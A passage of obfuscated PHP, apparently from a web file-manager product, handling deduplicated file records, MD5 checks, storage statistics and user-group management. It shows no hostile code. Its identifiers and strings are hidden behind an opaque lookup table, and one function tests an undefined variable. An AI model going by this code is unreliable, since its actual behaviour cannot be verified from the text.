KodIO::clear($¼¨Õ²ù´)); $Ùˆ’ü© = $Œ²ŸèŒ->ext($¼¨Õ²ù´); if (!$¼¨Õ²ù´) { $¥Ş€õ»¹ = $ı´­æ±Ü[1891]; } switch ($¥Ş€õ»¹) { case $ı´­æ±Ü[1892]: $±É°ÊÑ = $±É°ÊÑ . $ı´­æ±Ü[10] . $Œ²ŸèŒ->ext($¼¨Õ²ù´); if ($Ùˆ’ü© == $ı´­æ±Ü[1829]) { $±É°ÊÑ .= $ı´­æ±Ü[1558]; } break; case $ı´­æ±Ü[1893]: $¿¡¸Óşğ = Model($ı´­æ±Ü[783])->get($ı´­æ±Ü[784]); $ÅİªÈ®È = substr(md5($ı´­æ±Ü[785] . $¿¡¸Óşğ . date($ı´­æ±Ü[761])), 0, 8); $©Òş‘¶ = KodIO::defaultDriver(); $şè…Êı = $ı´­æ±Ü[1235] . $©Òş‘¶[$ı´­æ±Ü[407]] . $ı´­æ±Ü[417] . date($ı´­æ±Ü[1894]) . $ÅİªÈ®È . $ı´­æ±Ü[8]; if ($Ùˆ’ü© == $ı´­æ±Ü[1829]) { $¼¨Õ²ù´ .= $ı´­æ±Ü[1558]; } $˜®“Âç‘ = $ı´­æ±Ü[1895] . $şè…Êı . $¼¨Õ²ù´; CacheLock::lock($˜®“Âç‘); $±É°ÊÑ = $şè…Êı . $¼¨Õ²ù´; if (IO::exist($şè…Êı . $¼¨Õ²ù´)) { $Óä°ÛÒû = substr($¼¨Õ²ù´, 0, strlen($¼¨Õ²ù´) - strlen($Ùˆ’ü©)); $ËÅÓÕ¼á = $æÂ­ù½× ? substr($æÂ­ù½×, 0, 5) : ($óÎœ‹íÊ ? substr($óÎœ‹íÊ, 0, 5) : rand_string(5)); $±É°ÊÑ = $şè…Êı . $Óä°ÛÒû . $ËÅÓÕ¼á . $ı´­æ±Ü[10] . $Ùˆ’ü©; } if (IO::isTypeObject($±É°ÊÑ) && !IO::isUploadServer($±É°ÊÑ)) { if (IO::exist($±É°ÊÑ)) { return $±É°ÊÑ; } $ºçÒ“€¡ = IO::setContent($±É°ÊÑ, $ı´­æ±Ü[12]); if (!$ºçÒ“€¡) { show_json($ı´­æ±Ü[1896], !1); } } CacheLock::unlock($˜®“Âç‘); break; case $ı´­æ±Ü[1891]: break; default: break; } return $±É°ÊÑ; } public function addFileByRemote($³ŞÜèµü, $ô’–øºë, $úıÇäáõ = array()) { $Ê‹–Ùœô =& $_SERVER[ Ö‘ñÄ”]; if (!IO::exist($³ŞÜèµü)) { return !1; } $²Ã¦ãÁÖ = $úıÇäáõ[$Ê‹–Ùœô[176]] ? $úıÇäáõ[$Ê‹–Ùœô[176]] : $Ê‹–Ùœô[12]; $·ŒÀÚ = IO::hashMd5($³ŞÜèµü, $²Ã¦ãÁÖ); $½„¥Ã‹™ = KodIO::defaultDriver(); $¨…ˆ¬Åà = array($Ê‹–Ùœô[593] => IO::size($³ŞÜèµü), $Ê‹–Ùœô[1897] => 1, $Ê‹–Ùœô[428] => $ô’–øºë, $Ê‹–Ùœô[821] => $½„¥Ã‹™[$Ê‹–Ùœô[407]], $Ê‹–Ùœô[429] => $³ŞÜèµü, $Ê‹–Ùœô[1898] => $úıÇäáõ[$Ê‹–Ùœô[177]] ? $úıÇäáõ[$Ê‹–Ùœô[177]] : IO::hashSimple($³ŞÜèµü), $Ê‹–Ùœô[1899] => $·ŒÀÚ ? $·ŒÀÚ : $²Ã¦ãÁÖ); if ($³Â¹õèä = $this->addFileCheckExist($¨…ˆ¬Åà[$Ê‹–Ùœô[177]], $¨…ˆ¬Åà[$Ê‹–Ùœô[176]], $¨…ˆ¬Åà[$Ê‹–Ùœô[76]])) { return $³Â¹õèä; } return $this->addFileData($¨…ˆ¬Åà); } private function addFileData($ÇŒâ¾³Ê) { $úıÄÖ¯¹ =& $_SERVER[ Ö‘ñÄ”]; if (!$ÇŒâ¾³Ê) { return !1; } $ÇŒâ¾³Ê[$úıÄÖ¯¹[76]] = intval($ÇŒâ¾³Ê[$úıÄÖ¯¹[76]]); if (!$ÇŒâ¾³Ê[$úıÄÖ¯¹[76]] && strlen($ÇŒâ¾³Ê[$úıÄÖ¯¹[177]]) > 32) { $ÇŒâ¾³Ê[$úıÄÖ¯¹[76]] = intval(substr($ÇŒâ¾³Ê[$úıÄÖ¯¹[177]], 32)); } $† ¹·¶© = $this->add($ÇŒâ¾³Ê); return $this->find($† ¹·¶©); } public function addFile($¡Â“±Ê¿, $ıöí–êø, $ßääïä = false) { $¿‰ã®Áû =& $_SERVER[ Ö‘ñÄ”]; $Â¤ôËî = IO::hashSimple($¡Â“±Ê¿); $œö×²¹´ = IO::size($¡Â“±Ê¿); $£³ÄÅíÛ = $œö×²¹´ <= 1024 * 1024 * 10 ? IO::hashMd5($¡Â“±Ê¿) : $¿‰ã®Áû[12]; $Ì¸Òçéƒ = $¿‰ã®Áû[1900] . $Â¤ôËî; CacheLock::lock($Ì¸Òçéƒ); if ($£³ÄÅíÛ && $Â¤ôËî) { $ˆ¥»Œ‚û = $this->addFileCheckExist($Â¤ôËî, $£³ÄÅíÛ, $œö×²¹´); if ($ˆ¥»Œ‚û) { CacheLock::unlock($Ì¸Òçéƒ); return $ˆ¥»Œ‚û; } } $ëËÍ‰­ƒ = $this->addFileMake($¡Â“±Ê¿, $œö×²¹´, $Â¤ôËî, $£³ÄÅíÛ, $ıöí–êø, $ßääïä); $Ò¢ü¸û = $this->addFileData($ëËÍ‰­ƒ); CacheLock::unlock($Ì¸Òçéƒ); if (!$£³ÄÅíÛ && $Ò¢ü¸û) { $this->fileMd5Check($Ò¢ü¸û); } return $Ò¢ü¸û; } private function fileMd5Check($¶‹œ†‚§) { $ˆÌ¾ƒ¦å =& $_SERVER[ Ö‘ñÄ”]; $€¡ª¨’” = array($¶‹œ†‚§[$ˆÌ¾ƒ¦å[476]], $¶‹œ†‚§[$ˆÌ¾ƒ¦å[84]]); $© ìöÀ¬ = $ˆÌ¾ƒ¦å[1901] . $¶‹œ†‚§[$ˆÌ¾ƒ¦å[84]]; $Ê•üÉ = $ˆÌ¾ƒ¦å[1902] . $¶‹œ†‚§[$ˆÌ¾ƒ¦å[476]]; $¸‘Ã‚²” = TaskQueue::add($ˆÌ¾ƒ¦å[1903], $€¡ª¨’”, $© ìöÀ¬, $Ê•üÉ); if (!$¸‘Ã‚²”) { $this->fileMd5Set($¶‹œ†‚§[$ˆÌ¾ƒ¦å[476]], $¶‹œ†‚§[$ˆÌ¾ƒ¦å[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($–Æğ¯“, $Ù—’Ï±) { $Ğâ“¼à” =& $_SERVER[ Ö‘ñÄ”]; $ÏŠ÷Ø®Ÿ = $this->find($–Æğ¯“); if (!$ÏŠ÷Ø®Ÿ || $ÏŠ÷Ø®Ÿ[$Ğâ“¼à”[176]]) { return; } $¼µ„¶È = IO::hashMd5($Ù—’Ï±); if (!$¼µ„¶È) { return $Ğâ“¼à”[12]; } $this->where(array($Ğâ“¼à”[476] => $–Æğ¯“))->save(array($Ğâ“¼à”[176] => $¼µ„¶È)); } public function addFileMake($‹¶ï©Æ, $´âõó”¨, $„šŸ‹‰¶, $¼¯¡èú, $öµ‡ÍÙ®, $œÛõ ®) { $—Íª…æè =& $_SERVER[ Ö‘ñÄ”]; $æèÎ¸‘· = $this->createFileName($öµ‡ÍÙ®, $„šŸ‹‰¶, $¼¯¡èú); $æÙ…éĞ¦ = get_path_father($æèÎ¸‘·); $õ„½Ú†ä = get_path_this($æèÎ¸‘·); if ($œÛõ ®) { $Û ŠºÆ® = IO::move($‹¶ï©Æ, $æÙ…éĞ¦, !1, $õ„½Ú†ä); } else { $Û ŠºÆ® = IO::copy($‹¶ï©Æ, $æÙ…éĞ¦, !1, $õ„½Ú†ä); } if (!$Û ŠºÆ®) { return !1; } $…»ÒÓå = KodIO::defaultDriver(); $ºÉŸ÷£® = array($—Íª…æè[593] => $´âõó”¨, $—Íª…æè[1897] => 1, $—Íª…æè[428] => $öµ‡ÍÙ®, $—Íª…æè[821] => $…»ÒÓå[$—Íª…æè[407]], $—Íª…æè[429] => $æèÎ¸‘·, $—Íª…æè[1898] => $„šŸ‹‰¶, $—Íª…æè[1899] => $¼¯¡èú); return $ºÉŸ÷£®; } public function addFileCheckExist($ôÈ— ¦ò, $ù™İ¾‚®, $¼şÂ—ú›) { $˜£Ü•› =& $_SERVER[ Ö‘ñÄ”]; $àÂãñ¸Ò = $this->findByHash($ôÈ— ¦ò, $ù™İ¾‚®); if (!$àÂãñ¸Ò) { return !1; } $ó¿²š˜ = array($˜£Ü•›[1897] => intval($àÂãñ¸Ò[$˜£Ü•›[1904]]) + 1, $˜£Ü•›[593] => $¼şÂ—ú›); $this->where(array($˜£Ü•›[477] => $àÂãñ¸Ò[$˜£Ü•›[476]]))->save($ó¿²š˜); return $àÂãñ¸Ò; } public function remove($¥ã¬—Šµ) { $this->linkCountChange($¥ã¬—Šµ, !1); $this->clearEmpty(); return !0; } public function linkAdd($ĞóËüøß) { $this->linkCountChange($ĞóËüøß, !0); } public function linkCountChange($ÆèîÂ²ì, $÷ê·™) { $µ…£Û‰ =& $_SERVER[ Ö‘ñÄ”]; if (!$ÆèîÂ²ì) { return; } if (!is_array($ÆèîÂ²ì)) { $ÆèîÂ²ì = array($ÆèîÂ²ì); } $€ÚÙïµ = array(); foreach ($ÆèîÂ²ì as $÷Ã™Ø¯õ) { $¼²¦Æ¦— = $÷Ã™Ø¯õ . $µ…£Û‰[12]; if (!$€ÚÙïµ[$¼²¦Æ¦—]) { $€ÚÙïµ[$¼²¦Æ¦—] = 0; } $€ÚÙïµ[$¼²¦Æ¦—]++; } $ş…™ß = array(); foreach ($€ÚÙïµ as $÷Ã™Ø¯õ => $¢…ıéÄ) { $¼²¦Æ¦— = $¢…ıéÄ . $µ…£Û‰[12]; if (!$ş…™ß[$¼²¦Æ¦—]) { $ş…™ß[$¼²¦Æ¦—] = array(); } $ş…™ß[$¼²¦Æ¦—][] = $÷Ã™Ø¯õ; } foreach ($ş…™ß as $¢…ıéÄ => $ÌùöøÇÀ) { if (!$ÌùöøÇÀ) { continue; } $¢…ıéÄ = $÷ê·™ ? $¢…ıéÄ : -intval($¢…ıéÄ); $½¨ğ İ = array($µ…£Û‰[476] => array($µ…£Û‰[7], $ÌùöøÇÀ)); if ($¢…ıéÄ < 0) { $½¨ğ İ[$µ…£Û‰[1904]] = array($µ…£Û‰[1021], abs($¢…ıéÄ)); } $this->where($½¨ğ İ)->setAdd($µ…£Û‰[1904], $¢…ıéÄ); } } public function findByHash($‹ë¨ÔŒ, $äÏèÎµÑ = false) { $†€¡ŠÎò =& $_SERVER[ Ö‘ñÄ”]; if (!$‹ë¨ÔŒ && !$äÏèÎµÑ) { return !1; } $õÌ“Ş½Ü = array($†€¡ŠÎò[1898] => $‹ë¨ÔŒ); if ($äÏèÎµÑ) { $õÌ“Ş½Ü = array($†€¡ŠÎò[1899] => $äÏèÎµÑ); } return $this->order($†€¡ŠÎò[1905])->where($õÌ“Ş½Ü)->find(); } public function clearEmpty($ıÄÜúò‰ = 0) { $Æ›‰åÇœ =& $_SERVER[ Ö‘ñÄ”]; $ÓÄèşñ£ = time() - 3600 * 24 * $ıÄÜúò‰; $ÜÚè¨³ = $Æ›‰åÇœ[1906] . $ÓÄèşñ£; $îÇ¿©ìá = $this->where($ÜÚè¨³)->select(); if (!$îÇ¿©ìá) { return; } $¢ˆú·Õ“ = new Task($Æ›‰åÇœ[1907], $Æ›‰åÇœ[12], count($îÇ¿©ìá)); foreach ($îÇ¿©ìá as $û§—ïÇ–) { $¢ˆú·Õ“->update(1); $this->resetFile($û§—ïÇ–); } $¢ˆú·Õ“->end(); } public function resetFile($ÊÛè’ƒˆ) { $ÇšÊÅÄÏ =& $_SERVER[ Ö‘ñÄ”]; $ıüâ•Ô‰ = array($ÇšÊÅÄÏ[477] => $ÊÛè’ƒˆ[$ÇšÊÅÄÏ[476]]); $ì—‚õ¹» = Model($ÇšÊÅÄÏ[1333])->where($ıüâ•Ô‰)->count(); $®­„©ƒÏ = Model($ÇšÊÅÄÏ[1908])->where($ıüâ•Ô‰)->count(); $ûş£¨¥ê = intval($ì—‚õ¹») + intval($®­„©ƒÏ); if ($ûş£¨¥ê == 0) { IO::remove($ÊÛè’ƒˆ[$ÇšÊÅÄÏ[84]]); Model($ÇšÊÅÄÏ[1909])->delete($ÊÛè’ƒˆ[$ÇšÊÅÄÏ[476]]); $this->where($ıüâ•Ô‰)->delete(); $this->metaSet($ÊÛè’ƒˆ[$ÇšÊÅÄÏ[476]], null, null); return; } if ($ÊÛè’ƒˆ[$ÇšÊÅÄÏ[1904]] != $ûş£¨¥ê) { $this->where($ıüâ•Ô‰)->save(array($ÇšÊÅÄÏ[1897] => $ûş£¨¥ê)); } } public function storageInfo($ÌÌíˆêŞ = false) { $ä¼à¾ïç =& $_SERVER[ Ö‘ñÄ”]; $äö²Õú­ = $this->count() + 0.0; $Û£Îö´è = 0; $ÇÕäç¸Œ = 1; $Ç­Š§Ë¸ = 0; $çˆò“»¼ = 5000; for ($Ä† ¯¦ü = 0; $Ä† ¯¦ü < $äö²Õú­; $Ä† ¯¦ü = $Ä† ¯¦ü + $çˆò“»¼) { $çŸ÷¼¬° = $this->limit($Ä† ¯¦ü, $Ä† ¯¦ü + $çˆò“»¼)->select(); foreach ($çŸ÷¼¬° as $é¤±²îƒ) { $ÇÕäç¸Œ += $é¤±²îƒ[$ä¼à¾ïç[76]] * $é¤±²îƒ[$ä¼à¾ïç[1904]]; $Û£Îö´è += $é¤±²îƒ[$ä¼à¾ïç[76]] * ($é¤±²îƒ[$ä¼à¾ïç[1904]] - 1); $Ç­Š§Ë¸ += $é¤±²îƒ[$ä¼à¾ïç[1904]]; } } $İ¨¡İÜ = array($ä¼à¾ïç[1910] => $ÇÕäç¸Œ, $ä¼à¾ïç[1911] => $Û£Îö´è, $ä¼à¾ïç[1912] => $Û£Îö´è / $ÇÕäç¸Œ, $ä¼à¾ïç[80] => $äö²Õú­, $ä¼à¾ïç[1913] => $Ç­Š§Ë¸); return $İ¨¡İÜ; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\160"; protected $tableMeta = array("\164\141\x62\x6c\145\116\141\x6d\x65" => "\147\162\x6f\165\160\137\155\x65\164\141", "\x6d\x65\x74\x61\106\151\145\x6c\144" => "\x67\162\x6f\165\x70\111\104"); protected function cacheFunctionAlias($öçÃ÷ë) { $§·È˜Ú =& $_SERVER[ Ö‘ñÄ”]; return array($§·È˜Ú[1914] => array($öçÃ÷ë[0], $§·È˜Ú[1915]), $§·È˜Ú[1916] => array($öçÃ÷ë[0], $§·È˜Ú[1917])); } protected function getInfo($¨”Í¦äİ, $Æ“ä£¡… = false) { $öÌìŠŒÂ = $this->getInfoSimple($¨”Í¦äİ); if (!$öÌìŠŒÂ) { return !1; } if ($Æ“ä£¡…) { return $this->_listDataApplyItem($öÌìŠŒÂ); } return $this->cacheFunctionGet($_SERVER[ Ö‘ñÄ”][1918], $¨”Í¦äİ); } protected function getInfoSimple($ª¤ğï¯, $³öÃ—ëü = false) { $ÍÉ­…¼Ò =& $_SERVER[ Ö‘ñÄ”]; if ($³öÃ—ëü) { $²…íâÛê = array($ÍÉ­…¼Ò[1836] => intval($ª¤ğï¯)); $¾ÛŞñ¾Ğ = $this->where($²…íâÛê)->find(); return is_array($¾ÛŞñ¾Ğ) ? $¾ÛŞñ¾Ğ : array(); } return $this->cacheFunctionGet($ÍÉ­…¼Ò[1919], $ª¤ğï¯); } protected function groupAdd($®½ËÏÁò) { $²Êí± =& $_SERVER[ Ö‘ñÄ”]; if (!$®½ËÏÁò[$²Êí±[440]] && isset($®½ËÏÁò[$²Êí±[1836]]) && $®½ËÏÁò[$²Êí±[1836]] == 1) { if ($¥Ùâ÷âÖ = $this->getInfoSimple($®½ËÏÁò[$²Êí±[1836]], !0)) { return $®½ËÏÁò[$²Êí±[1836]]; } } else { $¥Ùâ÷âÖ = $this->getInfoSimple($®½ËÏÁò[$²Êí±[440]]); if (!$¥Ùâ÷âÖ) { return !1; } } $£ˆÁõûÕ = $²Êí±[539]; if ($¥Ùâ÷âÖ[$²Êí±[529]]) { $£ˆÁõûÕ = $¥Ùâ÷âÖ[$²Êí±[529]] . $¥Ùâ÷âÖ[$²Êí±[1836]] . $²Êí±[50]; } $¡æß¢Â = array($²Êí±[428] => $this->groupNameAuto($®½ËÏÁò[$²Êí±[440]], $®½ËÏÁò[$²Êí±[32]]), $²Êí±[409] => $®½ËÏÁò[$²Êí±[440]], $²Êí±[598] => $£ˆÁõûÕ, $²Êí±[1920] => $®½ËÏÁò[$²Êí±[1823]], $²Êí±[1921] => 0, $²Êí±[1840] => 0); if (isset($®½ËÏÁò[$²Êí±[1860]])) { $¡æß¢Â[$²Êí±[1860]] = $®½ËÏÁò[$²Êí±[1860]]; } else { $ÇÃöíÜø = $this->max($²Êí±[1860]); if (!$ÇÃöíÜø) { $ÇÃöíÜø = 0; } $¡æß¢Â[$²Êí±[1860]] = $ÇÃöíÜø + 1; } if (!empty($®½ËÏÁò[$²Êí±[1836]])) { $¡æß¢Â[$²Êí±[1836]] = $®½ËÏÁò[$²Êí±[1836]]; } $Ğ™é¸Å‹ = $this->add($¡æß¢Â); $this->setNamePinyin($Ğ™é¸Å‹, $¡æß¢Â[$²Êí±[32]]); if (isset($®½ËÏÁò[$²Êí±[1922]])) { $this->metaSet($Ğ™é¸Å‹, array($²Êí±[1922] => $®½ËÏÁò[$²Êí±[1922]], $²Êí±[1923] => $®½ËÏÁò[$²Êí±[1923]])); unset($®½ËÏÁò[$²Êí±[1922]]); unset($®½ËÏÁò[$²Êí±[1923]]); } Model($²Êí±[1333])->groupRootAdd($Ğ™é¸Å‹); return $Ğ™é¸Å‹; } protected function groupEdit($Ÿ¹®‡áê, $¬ùÔÂ³¶) { $Òû®ş½É =& $_SERVER[ Ö‘ñÄ”]; $ôÈÓà‰ƒ = $this->getInfoSimple($Ÿ¹®‡áê); if (!$ôÈÓà‰ƒ) { return !1; } if (!empty($¬ùÔÂ³¶[$Òû®ş½É[440]])) { $»å“®Ä‚ = $this->getInfoSimple($¬ùÔÂ³¶[$Òû®ş½É[440]]); if (!$»å“®Ä‚) { return !1; } if ($ôÈÓà‰ƒ[$Òû®ş½É[1836]] == $»å“®Ä‚[$Òû®ş½É[1836]]) { return !1; } if ($¬ùÔÂ³¶[$Òû®ş½É[440]] != $ôÈÓà‰ƒ[$Òû®ş½É[440]]) { if ($»å“®Ä‚[$Òû®ş½É[529]] !== $ôÈÓà‰ƒ[$Òû®ş½É[529]] && strpos($»å“®Ä‚[$Òû®ş½É[529]], $ôÈÓà‰ƒ[$Òû®ş½É[529]] . $ôÈÓà‰ƒ[$Òû®ş½É[1836]] . $Òû®ş½É[50]) === 0) { return !1; } $¬ùÔÂ³¶[$Òû®ş½É[598]] = $»å“®Ä‚[$Òû®ş½É[529]] . $¬ùÔÂ³¶[$Òû®ş½É[440]] . $Òû®ş½É[50]; $this->_changeChildLevel($ôÈÓà‰ƒ, $»å“®Ä‚); } } if (isset($¬ùÔÂ³¶[$Òû®ş½É[32]])) { $this->setNamePinyin($Ÿ¹®‡áê, $¬ùÔÂ³¶[$Òû®ş½É[32]]); } if (isset($¬ùÔÂ³¶[$Òû®ş½É[1922]])) { $this->metaSet($Ÿ¹®‡áê, array($Òû®ş½É[1922] => $¬ùÔÂ³¶[$Òû®ş½É[1922]], $Òû®ş½É[1923] => $¬ùÔÂ³¶[$Òû®ş½É[1923]])); unset($¬ùÔÂ³¶[$Òû®ş½É[1922]]); unset($¬ùÔÂ³¶[$Òû®ş½É[1923]]); } $this->_clearChildrenCache($ôÈÓà‰ƒ); return $this->where(array($Òû®ş½É[1924] => $Ÿ¹®‡áê))->save($¬ùÔÂ³¶); } private function _clearChildrenCache($•‰õ¹²) { $ÛñÎÀÈä =& $_SERVER[ Ö‘ñÄ”]; $æùöé¬¼ = array($ÛñÎÀÈä[598] => array($ÛñÎÀÈä[558], $•‰õ¹²[$ÛñÎÀÈä[529]] . $•‰õ¹²[$ÛñÎÀÈä[1836]] . $ÛñÎÀÈä[559])); $ŸÈ³õ¶€ = $this->field($ÛñÎÀÈä[1836])->where($æùöé¬¼)->select(); foreach ($ŸÈ³õ¶€ as $ôš’ÜÜß) { $this->_clearCache($ôš’ÜÜß[$ÛñÎÀÈä[1836]]); } } private function _clearCache($à½ªëıõ) { $ŒŒÂŞëÔ =& $_SERVER[ Ö‘ñÄ”]; $this->cacheFunctionClear($ŒŒÂŞëÔ[1918], $à½ªëıõ); $this->cacheFunctionClear($ŒŒÂŞëÔ[1919], $à½ªëıõ); } private function _changeChildLevel($™¿ğíÌ¼, $Ğš¹ö¾†, $³îè¯ëŸ = false) { $øê»Ï«æ =& $_SERVER[ Ö‘ñÄ”]; $¨´ùˆïÌ = $™¿ğíÌ¼[$øê»Ï«æ[529]] . $™¿ğíÌ¼[$øê»Ï«æ[1836]] . $øê»Ï«æ[50]; $ŒºÔøˆ© = $Ğš¹ö¾†[$øê»Ï«æ[529]] . $Ğš¹ö¾†[$øê»Ï«æ[1836]] . $øê»Ï«æ[50] . $™¿ğíÌ¼[$øê»Ï«æ[1836]] . $øê»Ï«æ[50]; if ($³îè¯ëŸ) { $ŒºÔøˆ© = $Ğš¹ö¾†[$øê»Ï«æ[529]] . $Ğš¹ö¾†[$øê»Ï«æ[1836]] . $øê»Ï«æ[50]; } $Ÿë’ĞŠï = array($øê»Ï«æ[598] => array($øê»Ï«æ[558], $™¿ğíÌ¼[$øê»Ï«æ[529]] . $™¿ğíÌ¼[$øê»Ï«æ[1836]] . $øê»Ï«æ[559])); $ı™Í‘ê× = array($øê»Ï«æ[598] => array($øê»Ï«æ[607], "\x72\145\160\154\141\143\x65\x28\160\x61\x72\x65\156\164\114\145\166\145\x6c\54\47{$¨´ùˆïÌ}\x27\54\47{$ŒºÔøˆ©}\x27\x29")); $this->_clearChildrenCache($™¿ğíÌ¼); $this->where($Ÿë’ĞŠï)->data($ı™Í‘ê×)->save(); } public function setNamePinyin($êùõÁ”‰, $µìƒÔö = false) { $¤¸ï‹º¥ =& $_SERVER[ Ö‘ñÄ”]; if (!$µìƒÔö) { $ëºä‡†ç = $this->getInfoSimple($êùõÁ”‰); $µìƒÔö = $ëºä‡†ç[$¤¸ï‹º¥[32]]; } if (!Input::check($µìƒÔö, $¤¸ï‹º¥[601])) { $this->metaSet($êùõÁ”‰, $¤¸ï‹º¥[473], null); $this->metaSet($êùõÁ”‰, $¤¸ï‹º¥[472], null); return; } $ÁÏ´¹¹õ = array($¤¸ï‹º¥[473] => str_replace($¤¸ï‹º¥[53], $¤¸ï‹º¥[12], Pinyin::get($µìƒÔö)), $¤¸ï‹º¥[472] => Pinyin::get($µìƒÔö, $¤¸ï‹º¥[602])); $this->metaSet($êùõÁ”‰, $ÁÏ´¹¹õ); } protected function groupStatus($›Â”¨Œ¿, $îáı²“) { $ú÷†Á¸Å =& $_SERVER[ Ö‘ñÄ”]; $ø¢ï¨¤¯ = $this->getInfoSimple($›Â”¨Œ¿); if (!$ø¢ï¨¤¯) { return !1; } if ($îáı²“ == $ú÷†Á¸Å[88]) { $³ãÊùÛ¼ = $this->parentLevelArray($ø¢ï¨¤¯[$ú÷†Á¸Å[529]]); } else { $‹ ãÇ©— = array($ú÷†Á¸Å[598] => array($ú÷†Á¸Å[558], $ø¢ï¨¤¯[$ú÷†Á¸Å[529]] . $ø¢ï¨¤¯[$ú÷†Á¸Å[1836]] . $ú÷†Á¸Å[559])); $³ãÊùÛ¼ = $this->where($‹ ãÇ©—)->field($ú÷†Á¸Å[1836])->select(); $³ãÊùÛ¼ = array_to_keyvalue($³ãÊùÛ¼, $ú÷†Á¸Å[12], $ú÷†Á¸Å[1836]); } $³ãÊùÛ¼[] = $ø¢ï¨¤¯[$ú÷†Á¸Å[1836]]; $™´Ò­µÖ = array(); foreach ($³ãÊùÛ¼ as $›Â”¨Œ¿) { $™´Ò­µÖ[] = array($ú÷†Á¸Å[1836] => $›Â”¨Œ¿, $ú÷†Á¸Å[94] => $ú÷†Á¸Å[763], $ú÷†Á¸Å[383] => $îáı²“); $this->_clearCache($›Â”¨Œ¿); } return Model($ú÷†Á¸Å[1925])->addAll($™´Ò­µÖ, array(), !0); } protected function groupRemove($ˆºˆòåü, $¨ãÙ‡íê = false) { $ó·åÙ¬Ë =& $_SERVER[ Ö‘ñÄ”]; $’ë’ôæ— = array($ó·åÙ¬Ë[1836] => $ˆºˆòåü); $ ¦„À– = $this->where($’ë’ôæ—)->find(); if (!$ ¦„À– || $ ¦„À–[$ó·åÙ¬Ë[440]] == 0) { return !1; } if (!$¨ãÙ‡íê) { $ÇîÁ•‚€ = $this->getInfoSimple($ ¦„À–[$ó·åÙ¬Ë[440]]); $this->_changeChildLevel($ ¦„À–, $ÇîÁ•‚€, !0); $this->where(array($ó·åÙ¬Ë[440] => $ˆºˆòåü))->save(array($ó·åÙ¬Ë[440] => $ ¦„À–[$ó·åÙ¬Ë[440]])); } Model($ó·åÙ¬Ë[1925])->where($’ë’ôæ—)->delete(); Model($ó·åÙ¬Ë[1926])->where($’ë’ôæ—)->delete(); Model($ó·åÙ¬Ë[838])->groupRootRemove($ˆºˆòåü); return $this->where($’ë’ôæ—)->delete(); } protected function groupSort($È÷á­È) { $µÄÉ†Ü© =& $_SERVER[ Ö‘ñÄ”]; $åÍİÓ­ = array(); foreach ($È÷á­È as $¤ƒñùƒ => $Šæ×Í“) { $åÍİÓ­[] = array($µÄÉ†Ü©[1836], $Šæ×Í“, $µÄÉ†Ü©[1860], $¤ƒñùƒ + 1); } $this->saveAll($åÍİÓ­); } public function listData() { $´¤ı®™ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($´¤ı®™[$_SERVER[ Ö‘ñÄ”][378]]); return $´¤ı®™; } private function _makeOrder($Ÿğïá¦ = '') { $‚éÚ“Šá =& $_SERVER[ Ö‘ñÄ”]; $¿€”ê€ = array($‚éÚ“Šá[1836], $‚éÚ“Šá[32], $‚éÚ“Šá[1825], $‚éÚ“Šá[200]); $Ç ù¹Â· = array($‚éÚ“Šá[458] => $‚éÚ“Šá[459], $‚éÚ“Šá[460] => $‚éÚ“Šá[461]); $šÖãÕø› = Input::get($‚éÚ“Šá[465], $‚éÚ“Šá[7], $‚éÚ“Šá[1840], $¿€”ê€); $Ì¤·ú¾ = Input::get($‚éÚ“Šá[466], $‚éÚ“Šá[7], $‚éÚ“Šá[1927], array($‚éÚ“Šá[1927], $‚éÚ“Šá[460])); $Ì¤·ú¾ = $Ç ù¹Â·[$Ì¤·ú¾]; $Ÿğïá¦ = $Ÿğïá¦ . "{$šÖãÕø›}\x20{$Ì¤·ú¾}\x2c\x20\147\162\x6f\165\x70\x49\x44\40\141\x73\143"; return $this->order($Ÿğïá¦); } public function listChild($Ã¦İôûÙ) { $ï€Ğé‡ =& $_SERVER[ Ö‘ñÄ”]; $šù¤Şã˜ = $this->where(array($ï€Ğé‡[440] => $Ã¦İôûÙ))->_makeOrder()->selectPage(200); $this->_listDataApply($šù¤Şã˜[$ï€Ğé‡[378]]); return $šù¤Şã˜; } public function listChildIds($ñˆš‚ÚÍ) { $¨å£Ç¸¢ =& $_SERVER[ Ö‘ñÄ”]; if (is_string($ À·ò¨»)) { $ñˆš‚ÚÍ = explode($¨å£Ç¸¢[50], $ñˆš‚ÚÍ); } $Ş“ô–† = $this->where(array($¨å£Ç¸¢[1836] => array($¨å£Ç¸¢[7], $ñˆš‚ÚÍ)))->field($¨å£Ç¸¢[1928])->select(); if (!$Ş“ô–†) { return !1; } $ş®Şİá– = array(); foreach ($Ş“ô–† as $Šš›í³æ) { $ş®Şİá–[] = "\163\145\x6c\145\143\x74\x20\x67\x72\157\x75\x70\111\104\x20\x66\162\157\155\40\x60\x67\x72\157\165\160\x60\40\x77\150\145\162\x65\x20\160\x61\162\x65\x6e\164\x4c\145\166\145\154\40\x6c\151\x6b\x65\40\x27{$Šš›í³æ[$¨å£Ç¸¢[529]]}{$Šš›í³æ[$¨å£Ç¸¢[1836]]}\54\45\x27"; } $ş®Şİá– = implode($¨å£Ç¸¢[1929], $ş®Şİá–); $Ş“ô–† = $this->query($ş®Şİá–); if (!$Ş“ô–†) { return array(); } $ñˆš‚ÚÍ = array_to_keyvalue($Ş“ô–†, $¨å£Ç¸¢[12], $¨å£Ç¸¢[1836]); return array_unique($ñˆš‚ÚÍ); } public function listByID($ñ‚Ä¶) { $ß…­½›‚ =& $_SERVER[ Ö‘ñÄ”]; if (!$ñ‚Ä¶) { return array(); } $„ïÖöË¾ = array($ß…­½›‚[1836] => array($ß…­½›‚[7], $ñ‚Ä¶)); $¾çŞÅ¯ë = $this->where($„ïÖöË¾)->select(); $¾çŞÅ¯ë = array_sort_keep($¾çŞÅ¯ë, $ß…­½›‚[1836], $ñ‚Ä¶); $this->_listDataApply($¾çŞÅ¯ë); return $¾çŞÅ¯ë; } public function listSearch($ÒĞæûµØ) { $ôĞ¹ÕœŠ =& $_SERVER[ Ö‘ñÄ”]; $§‹± Ñ˜ = $ÒĞæûµØ[$ôĞ¹ÕœŠ[1930]]; $ú³´¶ì = isset($ÒĞæûµØ[$ôĞ¹ÕœŠ[1931]]) ? $ÒĞæûµØ[$ôĞ¹ÕœŠ[1931]] : !1; if (!trim($§‹± Ñ˜)) { return !1; } $§‹± Ñ˜ = str_replace($ôĞ¹ÕœŠ[1932], $ôĞ¹ÕœŠ[1933], $§‹± Ñ˜); $°ÎçäúÕ = array($ôĞ¹ÕœŠ[1836] => array($ôĞ¹ÕœŠ[391], "{$§‹± 